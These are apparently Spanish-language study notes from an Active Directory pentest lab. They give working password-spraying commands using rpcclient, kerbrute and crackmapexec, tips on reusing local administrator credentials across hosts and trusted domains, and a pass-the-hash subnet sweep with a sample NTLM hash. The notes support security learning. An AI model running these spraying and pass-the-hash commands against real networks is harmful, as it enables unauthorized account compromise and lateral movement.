## Pass Spraying interno desde Linux

#### Rpccliente:
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

#### Kerbrute

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

#### Crackmapexec

```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

## Reutilizacion de contraseñas del administrador local

Si obtenemos creds de administrador local o un usuarios local es posible que se hayan reutilizado en el dominio

La reutilizacion de pass del administrador local es muy comun al usar gold images en despligues automatizados

Vale la pena apuntar a hosts de alto impacto

- Si encontramos en una workstation las creds del admin local como `$desktop%@admin123` podriamos intentar con servers `$server%@admin123`

- Si encontramos las creds de un usuario admin no estandar como `bsmith` podemos tratar de usarlas contra una cuenta de dominio 

- Si obtenemos las creds de `ajones` vale la pena probar `ajones_adm`

- Si obtenemos creds de un usuario del DOMINIO A y tiene relacion de confianza con DOMINIO B, podemos probarla para usuarios en el DOMINIO B

- Si solo obtenemos el Hash podemos hacer un PtH en la red en cuentas de administrador local de cada host usando la flag --local-auth para probar que solo la pruebe 1 vez

```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
